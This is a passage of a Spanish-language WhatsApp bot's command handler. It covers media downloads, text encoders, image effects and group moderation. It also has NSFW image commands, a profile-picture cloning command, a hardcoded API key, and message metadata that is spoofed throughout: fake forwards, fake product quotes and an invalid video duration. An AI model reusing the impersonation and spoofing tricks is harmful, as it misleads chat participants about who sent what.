͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${teks2}`
samu330.sendMessage(from, hasil, text, {
quoted: fimg
})
break
case 'playvid':

if (!isRegister) return reply(mess.only.usrReg)
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Me olvide de vivir`)
query = args.join(' ')
fakee = fs.readFileSync('./src/img.jpg')
try {
get_result = await getJson(`https://api.lolhuman.xyz/api/ytplay?apikey=${api}&query=${query}`)
get_result = get_result.result
get_info = get_result.info
ini_txt = `🧊Titulo : ${get_info.title}\n`
ini_txt += `🕵🏻‍♀️️Publicador : ${get_info.uploader}\n`
ini_txt += `🕐Duracion : ${get_info.duration}\n`
ini_txt += `👀Vistas : ${get_info.view}\n`
ini_txt += `👍🏻Like : ${get_info.like}\n`
ini_txt += `👎🏻Dislike : ${get_info.dislike}\n`
ini_txt += `📋Descripcion :\n ${get_info.description}\n\n`
ini_txt += `_Si el video no llega, puede descargar por aqui_ :\n ${get_result.video[0].link}\n\n`
ini_txt += `Puede descargar tambien el audio aqui: :\n ${get_result.audio[3].link}\n`
ini_buffer = await getBuffer(get_info.thumbnail)
await samu330.sendMessage(from, ini_buffer, image, { quoted: fvid, caption: ini_txt, thumbnail: fakee, contextInfo: {"forwardingScore": 9999, "isForwarded": true} })
get_video = await getBuffer(get_result.video[0].link)
await samu330.sendMessage(from, get_video, video, { mimetype: Mimetype.gif, duration :-999999999999999, filename: `${get_info.title}.mp4`, quoted: fvid })
} catch {
reply(`*Ocurrio un problema, la key vencio, puedes descargar videos de la siguiente manera:*\n\nBusca el video que quieras descargar con el comando *${prefix}ytsearch*\nCopias el link del video y descargas con: *${prefix}ytmp4*`)
}
break
case 'soyyo':
if (!isRegister) return reply(mess.only.usrReg)
try {
ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
nombredelwe = wa.getUserName(sender)
teks = `‣ *Nombre* : ${nombredelwe}
‣ *Número* : ${sender.split("@")[0]}
‣ *Link* : wa.me/${sender.split("@")[0]}`
its = await getBuffer (ppimg)
samu330.sendMessage(from, its, image, {
quoted: fliveLoc, caption: teks, contextInfo: {"forwardingScore": 9999, "isForwarded": true}
})

break
case 'pastebin':
if (args.length < 1) return reply('Escribe el texto que se mostrara en pastebin.')
paste = `${args.join(' ')}`
reply(mess.wait)
anu = await getJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${paste}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break

case 'abinario':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo binario.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/binary/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'binatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo binario para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/binary/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break

case 'aoctal':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo octal.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/octal/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'octalatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo octal para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/octal/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break


case 'ahex':
if (args.length < 1) return reply('Escribe el texto a convertir a codigo hex.')
encbinary = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/hex/?encode=${encbinary}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'hexatext':
if (args.length < 1) return reply('Porfavor, pega o escribe el codigo hex para convertir a texto.')
decbin = `${args.join(' ')}`
anu = await getJson(`https://api.anoncybfakeplayer.com/api/hex/?decode=${decbin}`, {method: 'get'})
samu330.sendMessage(from, `${anu.result}`, text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'tourl':
if (!isRegister) return reply(mess.only.userB)
var imgbb = require('imgbb-uploader')
if ((isMedia && !samu.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(samu).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
reply(mess.wait)
owgi = await samu330.downloadAndSaveMediaMessage(ger)
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi)
teks = `${anu.display_url}`
reply(teks)
}
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
porn = await getJson('https://meme-api.herokuapp.com/gimme/lesbians', {
method: 'get'
})
reply(mess.wait)
buffer = await getBuffer(`${porn.url}`)
samu330.sendMessage(from, buffer, image, {
fimg})
break

case 'tetas':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
pw = ["https://meme-api.herokuapp.com/gimme/tits",
"https://meme-api.herokuapp.com/gimme/BestTits",
"https://meme-api.herokuapp.com/gimme/boobs",
"https://meme-api.herokuapp.com/gimme/amazingtits",
"https://meme-api.herokuapp.com/gimme/TinyTits"]
nk = pw[Math.floor(Math.random() * pw.length)]
porn = await getJson(`${nk}`, {
method: 'get'
})
reply(mess.wait)
buffer = await getBuffer(`${porn.url}`)
samu330.sendMessage(from, buffer, image, {
quoted: fimg
})
break

case 'ass':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
pw = ["https://meme-api.herokuapp.com/gimme/CuteLittleButts",
"https://meme-api.herokuapp.com/gimme/ass",
"https://meme-api.herokuapp.com/gimme/boobs",
"https://meme-api.herokuapp.com/gimme/ass"]
nk = pw[Math.floor(Math.random() * pw.length)]
porn = await getJson(`${nk}`, {
method: 'get'
})
reply(mess.wait)
buffer = await getBuffer(`${porn.url}`)
samu330.sendMessage(from, buffer, image, {
quoted: fimg
})
break
//Esta funcion fue creada gracias a la api de fxc-7
case 'porno':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
pornito = ["https://fxc7-api.herokuapp.com/api/amateur?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal_gape?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/asian?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass-fucking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/japanese?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/babe?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ball_licking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/bath?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal_penetration?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/areolae?apikey=Fxc7"]
nopor = pornito[Math.floor(Math.random() * pornito.length)]
reply('*Espera un momento porfavor*')
iwant = await getJson(`${nopor}`, {method: 'get'})
you = await getBuffer(`${iwant.result}`)
samu330.sendMessage(from, you, image, {quoted: fvid, caption: '🍒', sendEphemeral: true})
break


case 'pussy':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
pw = ["https://meme-api.herokuapp.com/gimme/pussy",
"https://meme-api.herokuapp.com/gimme/LegalTeens"
]
nk = pw[Math.floor(Math.random() * pw.length)]
porn = await getJson(`${nk}`, {
method: 'get'
})
reply(mess.wait)
buffer = await getBuffer(`${porn.url}`)
samu330.sendMessage(from, buffer, image, {
quoted: fimg
})
break

case 'simi':

samu330.updatePresence(from, Presence.composing)
texto = body.slice(5)
sim = await getJson(`https://api.simsimi.net/v1/?text=${texto}&lang=es`)
smuu = (`${sim.success}`)
samu330.sendMessage(from, smuu, MessageType.text, {quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./src/simi.jpg`)
},
"title": `➫𝐒𝐢𝐦𝐬𝐢𝐦𝐢 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲🔥❣️`,
"description": `${texto}`,
"currencyCode": '',
"priceAmount1000": "999999999999999999999",
"retailerId": 'TOM',
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
})

break
case 'emoji':

if (args.length == 0) return reply(`Ejemplo: ${prefix + command} 😭`)
emoji = args[0]
try {
emoji = encodeURIComponent(emoji[0])
} catch {
emoji = encodeURIComponent(emoji)
}
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${api}`)
await samu330.sendMessage(from, ini_buffer, sticker, { quoted: ftoko })
break

case 'blackpink':
case 'neon':
case 'greenneon':
case 'advanceglow':
case 'futureneon':
case 'sandwriting':
case 'sandsummer':
case 'sandengraved':
case 'metaldark':
case 'neonlight':
case 'holographic':
case 'text1917':
case 'minion':
case 'deluxesilver':
case 'newyearcard':
case 'bloodfrosted':
case 'halloween':
case 'jokerlogo':
case 'fireworksparkle':
case 'natureleaves':
case 'bokeh':
case 'toxic':
case 'strawberry':
case 'box3d':
case 'roadwarning':
case 'breakwall':
case 'icecold':
case 'luxury':
case 'cloud':
case 'summersand':
case 'horrorblood':
case 'thunder':

if (args.length == 0) return reply(`Example: ${prefix + command} Samu330`)
reply(mess.wait)
ini_txt = args.join(" ")
try {
getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${api}&text=${ini_txt}`).then((gambar) => {
samu330.sendMessage(from, gambar, image, { quoted: sam })
})
} catch {
reply(mess.ferr)
}

break
case 'pornhub':
case 'glitch':
case 'avenger':
case 'space':
case 'ninjalogo':
case 'marvelstudio':
case 'lionlogo':
case 'wolflogo':
case 'steel3d':
case 'wallgravity':

if (args.length == 0) return reply(`Example: ${prefix + command} Samu330|Sam y Perry`)
reply(mess.wait)
a = args.join(' ')
txt1 = a.split("|")[0];
txt2 = a.split("|")[1];
try {
getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${api}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
samu330.sendMessage(from, gambar, image, { quoted: sam })
})
} catch {
reply(mess.ferr)
}

break



case 'sombra':
case 'cup':
case 'cup1':
case 'romance':
case 'smoke':
case 'burnpaper':
case 'lovemessage':
case 'undergrass':
case 'love':
case 'cafe':
case 'woodheart':
case 'woodenboard':
case 'summer3d':
case 'wolfmetal':
case 'nature3d':
case 'underwater':
case 'golderrose':
case 'summernature':
case 'letterleaves':
case 'glowingneon':
case 'fallleaves':
case 'flamming':
case 'hp':
case 'carvedwood':

if (args.length == 0) return reply(`Example: ${prefix + command} Samu330`)
reply(mess.wait)
ini_txt = args.join(' ')
try {
getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${api}&text=${ini_txt}`).then((gambar) => {
samu330.sendMessage(from, gambar, image, { quoted: sam })
})
} catch {
reply(mess.ferr)
}

break
case 'tiktok':
case 'arcade8bit':
case 'battlefield4':
case 'pubg':

if (args.length == 0) return reply(`Example: ${prefix + command} Samu330|Sam y Perry`)
reply(mess.wai)
a = args.join(' ')
txt1 = a.split("|")[0];
txt2 = a.split("|")[1];
try {
getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${api}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
samu330.sendMessage(from, gambar, image, { quoted: sam })
})
} catch {
reply(mess.ferr)
}

break

// Ephoto 360 //
case 'wetglass':
case 'multicolor3d':
case 'watercolor':
case 'luxurygold':
case 'galaxywallpaper':
case 'lighttext':
case 'beautifulflower':
case 'puppycute':
case 'royaltext':
case 'heartshaped':
case 'birthdaycake':
case 'galaxystyle':
case 'hologram3d':
case 'greenneon':
case 'glossychrome':
case 'greenbush':
case 'metallogo':
case 'noeltext':
case 'glittergold':
case 'textcake':
case 'starsnight':
case 'wooden3d':
case 'textbyname':
case 'writegalacy':
case 'galaxybat':
case 'snow3d':
case 'birthdayday':
case 'goldplaybutton':
case 'silverplaybutton':
case 'freefire':

if (args.length == 0) return reply(`Example: ${prefix + command} Sam y Perry`)
reply(mess.wait)
ini_txt = args.join(' ')
try {
getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${api}&text=${ini_txt}`).then((gambar) => {
samu330.sendMessage(from, gambar, image, { quoted: sam })
})
} catch {
reply(mess.ferr)
}

break
case 'chat':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var pc = budy.slice(6)
var nomor = pc.split("|")[0];
var org = pc.split("|")[1];
samu330.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)
reply(`*El memsaje:* ${org} *Se envio a:* ${nomor}`)
break
case 'setpic':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.updatePresence(from, Presence.composing)
if (!isQuotedImage) return reply(`Envia una imagen con el comando: *${prefix}setpp*`)
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
await samu330.updateProfilePicture(meNumber, media2)
reply('*Yap*')
break

case 'kick':
case 'eliminar':
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)
if (!botAdmin) return reply(mess.only.Badmin)
if (sam.message.extendedTextMessage === undefined || sam.message.extendedTextMessage === null) return reply('Etiqueta a alguien!')
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = '*Bai bai :* '
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
samu330.groupRemove(from, mentioned)
} else {
mentions(`Chao : @${mentioned[0].split('@')[0]}`, mentioned, true)
samu330.groupRemove(from, mentioned)
}
break
case 'wpsearch':

if (args.length == 0) return reply(`Example: ${prefix + command} gatos`)
query = args.join(' ')
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${api}&query=${query}`)
ini_buffer = await getBuffer(get_result.result)
await samu330.sendMessage(from, ini_buffer, image, { quoted: ftoko })

break

case 'translate':
if (args.length == 0) return reply(`Example: ${prefix + command} es Hi bro`)
idioma = args[0]
args.shift()
ini_txt = args.join(' ')
get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${idioma}?apikey=${api}&text=${ini_txt}`)
get_result = get_result.result
init_txt = `Traduccion de : ${get_result.from}\n`
init_txt += `a : ${get_result.to}\n`
init_txt += `Original : ${get_result.original}\n`
init_txt += `Traducido : ${get_result.translated}\n`
init_txt += `Pronunciacion : ${get_result.pronunciation}\n`
reply(init_txt)

break
case 'ping':
var groups = samu330.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = samu330.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
const timestamp = speed();
const totalChat = await samu330.chats.all()
const latensi = speed() - timestamp
//	const total12 = math(`${groups.length}*${privat.length}`)
teks = `_Pong_ xD\n*ESTADISTICAS DEL BOT:*\n*- Group Chats :* ${groups.length}\n*- Private Chats :* ${privat.length}\n*- Total Chats :* ${totalChat.length}\n*- Speed :* ${latensi.toFixed(4)} _Second_\n*- Active Time :* ${uptime}\n\n*PHONE STATISTICS:*\n*- 📱Capacidad de Ram :* ${ram2}\n*- 💻Plataforma :* ${os.platform()}\n*- 🌐Hostname :* ${os.hostname()}\n*- 🕐Uptime :* ${os.uptime()}\n*- 🪀Wa Version:* ${samu330.user.phone.wa_version}\n*- 📡Os Version:* ${samu330.user.phone.os_version}\n*- 🔐Device Manufacturer:* ${samu330.user.phone.device_manufacturer}\n*- 📲Device Model:* ${samu330.user.phone.device_model}\n*- 🧬Os Build Number:* ${samu330.user.phone.os_build_number}`
samu330.sendMessage(from, teks, text, {quoted: fdoc, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'clonar':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Etiqueta a alguien para utilizar su foto!!!')
if (sam.message.extendedTextMessage === undefined || sam.message.extendedTextMessage === null) return reply('Etiqueta a alguien')
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
let {jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await samu330.getProfilePicture(id)
buffer = await getBuffer(pp)
samu330.updateProfilePicture(botNumber, buffer)
mentions(`La foto de perfil se actualizó correctamente con la foto de perfil de: @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply(mess.ferr)
}

break
case 'queanime':
if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
reply(mess.wait)
const encmediaa = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const mediaa = await samu330.downloadMediaMessage(encmediaa)
await wait(mediaa).then(res => {
samu330.sendMessage(from, res.video, video, { quoted: ftoko, caption: res.teks.trim() })
}).catch(err => {
reply(err)
})
} else {
reply('Envia la magen para poder buscar el anime')
}
break
case 'colores':
if (args.length < 1) return reply('Y el texto?')
var teks = encodeURIComponent(args.join(' '))
const attp1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${teks}`)
samu330.sendMessage(from, attp1, sticker, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})

break

case 'añadir':
if (!isGroup) return reply(mess.only.group)
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Y el numero?')
if (args[0].startsWith('99')) return reply('Utiliza el codigo de pais')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
samu330.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
return samu330.sendMessage(from, 'Modo privado dice:v', MessageType.text)
}

break

case 'public':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (public) return await reply('*El modo publico Ya esta activado*')
config["public"] = true
public = true
fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
await wa.sendFakeStatus(from, "*Se activo el modo publico*", "Public : true")
break
case 'self':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!public) return await reply('El modo privado ya estaba activado')
config["public"] = false
public = false
fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
await wa.sendFakeStatus(from, "*Se a cambiado a modo PRIVADO*", "Self : true")
break
case 'bc':
if (!isOwner) return reply('Solo *Samu* puede usar este comando')
if (args.length < 1) return reply('Y el anuncio?')
anu = await samu330.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
buff = await samu330.downloadMediaMessage(encmedia)
for (let _ of anu) {
samu330.sendMessage(_.jid, buff, image, {caption: `*${body.slice(4)}*\n ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏